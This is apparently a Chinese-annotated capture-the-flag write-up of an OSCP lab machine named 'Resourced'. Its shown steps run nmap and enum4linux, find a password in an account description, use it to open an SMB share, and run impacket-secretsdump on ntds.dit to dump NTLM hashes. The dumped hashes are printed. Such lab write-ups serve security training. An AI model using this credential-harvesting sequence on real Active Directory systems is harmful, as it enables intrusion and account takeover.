## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ sudo nmap -A -sC -T4 192.168.154.175
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-03 22:22 CST
Nmap scan report for 192.168.154.175
Host is up (0.31s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-03 14:23:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2023-09-02T14:21:19
|_Not valid after:  2024-03-03T14:21:19
|_ssl-date: 2023-09-03T14:24:17+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-09-03T14:23:38+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): AVtech embedded (87%), Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%), Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time:
|   date: 2023-09-03T14:23:38
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   314.33 ms 192.168.45.1
2   314.35 ms 192.168.45.254
3   314.44 ms 192.168.251.1
4   314.49 ms 192.168.154.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.86 seconds
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ nmap -n -sV --script "ldap* and not brute" 192.168.154.175 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-03 22:33 CST
Nmap scan report for 192.168.154.175
Host is up (0.34s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-09-03 14:33:58Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=resourced,DC=local
|       ldapServiceName: resourced.local:resourcedc$@RESOURCED.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=resourced,DC=local
|       serverName: CN=RESOURCEDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=resourced,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=resourced,DC=local
|       namingContexts: DC=resourced,DC=local
|       namingContexts: CN=Configuration,DC=resourced,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=resourced,DC=local
|       namingContexts: DC=DomainDnsZones,DC=resourced,DC=local
|       namingContexts: DC=ForestDnsZones,DC=resourced,DC=local
|       isSynchronized: TRUE
|       highestCommittedUSN: 65590
|       dsServiceName: CN=NTDS Settings,CN=RESOURCEDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=resourced,DC=local
|       dnsHostName: ResourceDC.resourced.local
|       defaultNamingContext: DC=resourced,DC=local
|       currentTime: 20230903143424.0Z
|_      configurationNamingContext: CN=Configuration,DC=resourced,DC=local
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=resourced,DC=local
|       ldapServiceName: resourced.local:resourcedc$@RESOURCED.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=resourced,DC=local
|       serverName: CN=RESOURCEDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=resourced,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=resourced,DC=local
|       namingContexts: DC=resourced,DC=local
|       namingContexts: CN=Configuration,DC=resourced,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=resourced,DC=local
|       namingContexts: DC=DomainDnsZones,DC=resourced,DC=local
|       namingContexts: DC=ForestDnsZones,DC=resourced,DC=local
|       isSynchronized: TRUE
|       highestCommittedUSN: 65590
|       dsServiceName: CN=NTDS Settings,CN=RESOURCEDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=resourced,DC=local
|       dnsHostName: ResourceDC.resourced.local
|       defaultNamingContext: DC=resourced,DC=local
|       currentTime: 20230903143424.0Z
|_      configurationNamingContext: CN=Configuration,DC=resourced,DC=local
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.37 seconds
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ nmap --script "safe or smb-enum-*" -p 445 192.168.154.175
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-03 22:44 CST
Pre-scan script results:
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| broadcast-dns-service-discovery:
|   224.0.0.251
|     7000/tcp airplay
|       act=2
|       acl=0
|       deviceid=BC:D0:74:29:73:B3
|       fex=1c9/St5PFbgm
|       features=0x4A7FCFD5,0xB8154FDE
|       rsf=0x8
|       flags=0x204
|       gid=22F50759-E8DF-4BEC-8177-2910A0FE63E6
|       igl=0
|       gcgl=0
|       model=MacBookPro18,4
|       at=4
|       protovers=1.1
|       pi=b1afc0f4-79f3-4689-8fda-abaec8cfbc2a
|       psi=5525DF69-82AB-420A-B1B4-FE3354C3A64A
|       Address=172.16.95.1 fe80::bcd0:74ff:fe92:8464
|     7000/tcp raop
|       cn=0,1,2,3
|       da=true
|       et=0,3,5
|       ft=0x4A7FCFD5,0xB8154FDE
|       sf=0x204
|       md=0,1,2
|       am=MacBookPro18,4
|       Address=172.16.95.1 fe80::bcd0:74ff:fe92:8464
|     49290/tcp companion-link
|_      Address=172.16.95.1 fe80::bcd0:74ff:fe92:8464
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| targets-asn:
|_  targets-asn.asn is a mandatory parameter
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 43.29 seconds
```


```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ smbclient --no-pass -L //192.168.154.175
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.154.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ nmap -p- -n -vvv 192.168.154.175 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-03 22:49 CST
Initiating Connect Scan at 22:49
Scanning 192.168.154.175 [65535 ports]
Discovered open port 135/tcp on 192.168.154.175
Discovered open port 139/tcp on 192.168.154.175
Discovered open port 3389/tcp on 192.168.154.175
Discovered open port 445/tcp on 192.168.154.175
Discovered open port 53/tcp on 192.168.154.175
Connect Scan Timing: About 4.81% done; ETC: 23:00 (0:10:13 remaining)
Connect Scan Timing: About 11.39% done; ETC: 22:58 (0:07:54 remaining)
Connect Scan Timing: About 11.94% done; ETC: 23:02 (0:11:11 remaining)
Discovered open port 5985/tcp on 192.168.154.175
Connect Scan Timing: About 14.41% done; ETC: 23:03 (0:11:59 remaining)
Discovered open port 49703/tcp on 192.168.154.175
Connect Scan Timing: About 17.04% done; ETC: 23:04 (0:12:44 remaining)
Connect Scan Timing: About 17.81% done; ETC: 23:06 (0:14:23 remaining)
Connect Scan Timing: About 24.18% done; ETC: 23:04 (0:11:20 remaining)
Discovered open port 49671/tcp on 192.168.154.175
Discovered open port 49771/tcp on 192.168.154.175
Connect Scan Timing: About 29.63% done; ETC: 23:03 (0:09:47 remaining)
Discovered open port 49667/tcp on 192.168.154.175
Discovered open port 49670/tcp on 192.168.154.175
Connect Scan Timing: About 37.57% done; ETC: 23:03 (0:08:55 remaining)
Connect Scan Timing: About 44.98% done; ETC: 23:02 (0:07:11 remaining)
Connect Scan Timing: About 49.37% done; ETC: 23:02 (0:06:32 remaining)
Discovered open port 464/tcp on 192.168.154.175
Discovered open port 3269/tcp on 192.168.154.175
Connect Scan Timing: About 55.09% done; ETC: 23:02 (0:05:51 remaining)
Discovered open port 49666/tcp on 192.168.154.175
Connect Scan Timing: About 60.38% done; ETC: 23:02 (0:05:10 remaining)
Connect Scan Timing: About 67.70% done; ETC: 23:01 (0:04:00 remaining)
Discovered open port 593/tcp on 192.168.154.175
Discovered open port 9389/tcp on 192.168.154.175
Connect Scan Timing: About 76.86% done; ETC: 23:00 (0:02:40 remaining)
Discovered open port 3268/tcp on 192.168.154.175
Connect Scan Timing: About 82.44% done; ETC: 23:00 (0:02:02 remaining)
Discovered open port 88/tcp on 192.168.154.175
Connect Scan Timing: About 89.84% done; ETC: 23:00 (0:01:08 remaining)
Discovered open port 389/tcp on 192.168.154.175
Discovered open port 636/tcp on 192.168.154.175
Completed Connect Scan at 23:00, 663.09s elapsed (65535 total ports)
Nmap scan report for 192.168.154.175
Host is up, received user-set (0.31s latency).
Scanned at 2023-09-03 22:49:21 CST for 663s
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3389/tcp  open  ms-wbt-server    syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49703/tcp open  unknown          syn-ack
49771/tcp open  unknown          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 663.15 seconds

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ sudo nmap -A -sC -T4 192.168.154.175 -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49670,4967
1,49703,49771
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-03 23:05 CST
Nmap scan report for 192.168.154.175
Host is up (0.32s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-03 15:05:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-09-03T15:07:00+00:00
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2023-09-02T14:21:19
|_Not valid after:  2024-03-03T14:21:19
|_ssl-date: 2023-09-03T15:07:38+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49771/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): AVtech embedded (87%)
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-09-03T15:07:03
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   319.52 ms 192.168.45.1
2   319.38 ms 192.168.45.254
3   321.69 ms 192.168.251.1
4   321.74 ms 192.168.154.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.34 seconds
```

用 enum4linux 掃描，可得到 user 資訊

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ enum4linux -a 192.168.154.175
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Sep  3 23:08:08 2023

 =========================================( Target Information )=========================================

Target ........... 192.168.154.175
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

...

 ======================================( Users on 192.168.154.175 )======================================

index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant	Name: (null)	Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg	Name: (null)	Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson	Name: (null)	Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen	Name: (null)	Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone	Name: (null)	Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason	Name: (null)	Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker	Name: (null)	Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson	Name: (null)	Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson	Name: (null)	Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz	Name: (null)	Desc: New-hired, reminder: HotelCalifornia194!

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[M.Mason] rid:[0x44f]
user:[K.Keen] rid:[0x450]
user:[L.Livingstone] rid:[0x451]
user:[J.Johnson] rid:[0x452]
user:[V.Ventz] rid:[0x453]
user:[S.Swanson] rid:[0x454]
user:[P.Parker] rid:[0x455]
user:[R.Robinson] rid:[0x456]
user:[D.Durant] rid:[0x457]
user:[G.Goldberg] rid:[0x458]

...
```

發現疑似 V.Ventz 密碼

```json
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz	Name: (null)	Desc: New-hired, reminder: HotelCalifornia194!
```

嘗試用 smb 連線，成功！

```json
┌──(ouyang㉿kali)-[/usr/share/seclists/Usernames/Names]
└─$ smbclient -U "V.Ventz" -L //192.168.154.175
Password for [WORKGROUP\V.Ventz]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Password Audit  Disk
	SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.

┌──(ouyang㉿kali)-[/usr/share/seclists/Usernames/Names]
└─$ smbclient -U "V.Ventz" //192.168.154.175/Password\ Audit
Password for [WORKGROUP\V.Ventz]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Oct  5 16:49:16 2021
  ..                                  D        0  Tue Oct  5 16:49:16 2021
  Active Directory                    D        0  Tue Oct  5 16:49:15 2021
  registry                            D        0  Tue Oct  5 16:49:16 2021

		7706623 blocks of size 4096. 2725151 blocks available
```

改用 impacket-smbclient 連線

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ impacket-smbclient V.Ventz:'HotelCalifornia194!'@192.168.154.175
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)


# use Password Audit
# ls
drw-rw-rw-          0  Tue Oct  5 16:49:16 2021 .
drw-rw-rw-          0  Tue Oct  5 16:49:16 2021 ..
drw-rw-rw-          0  Tue Oct  5 16:49:16 2021 Active Directory
drw-rw-rw-          0  Tue Oct  5 16:49:16 2021 registry


```

[Hacktricks](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#extracting-hashes-from-ntds.dit)

依照教學使用 impacket-secretdump 獲取 hash

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Resourced]
└─$ impacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
